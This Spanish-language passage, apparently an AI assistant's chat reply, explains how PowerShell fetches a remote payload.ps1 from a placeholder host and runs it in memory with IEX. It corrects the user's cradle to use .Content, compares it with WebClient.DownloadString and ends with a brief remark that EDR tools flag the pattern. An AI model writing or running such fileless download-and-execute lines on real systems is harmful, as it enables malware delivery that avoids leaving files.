
Cuando escribes:

```powershell
$texto = Invoke-WebRequest http://web/payload.ps1
IEX $texto
```

PowerShell:

1️⃣ Hace una petición HTTP
2️⃣ Descarga el contenido
3️⃣ Lo guarda en `$texto`
4️⃣ `IEX` (Invoke-Expression) ejecuta lo que haya dentro

Pero aquí hay un **detalle importante**:

 `$texto` NO es un string directamente.
 
 Es un **objeto**.

---

## ✅ Forma correcta y limpia

La forma correcta es:

```powershell
$texto = (Invoke-WebRequest http://web/payload.ps1).Content
IEX $texto
```

O en una sola línea:

```powershell
IEX (Invoke-WebRequest http://web/payload.ps1).Content
```

---

##  Por qué parece equivalente a WebClient

Cuando haces:

```powershell
(New-Object Net.WebClient).DownloadString("http://web/payload.ps1")
```

Eso devuelve:

 Un **string**

Mientras que:

```powershell
Invoke-WebRequest
```

Devuelve:

 Un **objeto** que contiene muchas cosas

Entre ellas:

```powershell
$response.Content
```

Que es el string.

---

##  Entonces tu ejemplo comparativo

Esto:

```powershell
(New-Object Net.WebClient).DownloadString("http://web/payload.ps1")
```

Es equivalente a:

```powershell
(Invoke-WebRequest http://web/payload.ps1).Content
```

No exactamente a:

```powershell
Invoke-WebRequest http://web/payload.ps1
```

Ese es el matiz.

---

##  Tu idea base era correcta

Lo que tú entendiste:

✔ Se obtiene texto
✔ Se ejecuta texto
✔ No se crea archivo

Eso es **100% correcto**.

Solo faltaba entender que:

Invoke-WebRequest devuelve un objeto
Y tú usas su propiedad `.Content`.

---

## 📌 Regla mental definitiva

Memoriza esta línea:

```
Invoke-WebRequest -> objeto
Invoke-WebRequest).Content -> texto
```

---

## ⚠ Mini advertencia importante

Muchos antivirus y EDR detectan:

```powershell
IEX (Invoke-WebRequest ...)
```

Porque es patrón clásico de malware.

En entornos defensivos se monitoriza mucho.

---

Lo que te dije antes y lo que estamos diciendo ahora **no se contradicen**.

Simplemente ahora tienes la versión:

➡ Más precisa
➡ Más técnica
➡ Más correcta
